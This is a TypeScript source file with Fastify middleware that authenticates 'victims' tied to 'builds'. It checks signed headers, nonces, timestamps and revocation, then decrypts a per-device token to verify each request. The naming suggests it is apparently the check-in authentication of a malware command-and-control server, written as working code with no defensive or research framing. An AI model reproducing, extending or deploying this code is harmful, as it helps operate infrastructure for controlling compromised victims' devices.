import type { FastifyReply, FastifyRequest } from 'fastify';
import type { Victim, Build } from '@prisma/client';
import { prisma } from '../lib/db';
import { openSecret, verifyVictim } from '../lib/crypto';
import { claimNonce } from '../lib/nonce';
import { HttpError, unauth } from '../lib/errors';

declare module 'fastify' {
  interface FastifyRequest {
    rawBody: Buffer;
    victim?: Victim & { build: Build };
  }
}

const SKEW = 300;

export async function authenticateVictim(request: FastifyRequest, _reply: FastifyReply): Promise<void> {
  const id = request.headers['x-victim-id'];
  const timestamp = request.headers['x-timestamp'];
  const nonce = request.headers['x-nonce'];
  const signature = request.headers['x-signature'];
  if (
    typeof id !== 'string' ||
    typeof timestamp !== 'string' ||
    typeof nonce !== 'string' ||
    typeof signature !== 'string'
  ) {
    throw unauth('bad_signature');
  }
  if (nonce.length < 16) throw unauth('bad_nonce');
  const now = Math.floor(Date.now() / 1000);
  if (Math.abs(now - Number(timestamp)) > SKEW) throw unauth('clock_skew');

  const victim = await prisma.victim.findUnique({ where: { id }, include: { build: true } });
  if (!victim) throw unauth('unknown_victim');
  if (victim.revokedAt || victim.build.revokedAt) throw new HttpError(403, 'revoked', 'victim revoked');
  if (!(await claimNonce(id, nonce))) throw new HttpError(409, 'replay', 'nonce already used');

  const token = openSecret(victim.deviceTokenEnc);
  const path = request.url.split('?')[0]!;
  const body = request.rawBody ?? Buffer.alloc(0);
  if (!verifyVictim(token, request.method, path, timestamp, nonce, body, signature)) {
    throw unauth('bad_signature');
  }
  request.victim = victim;
}
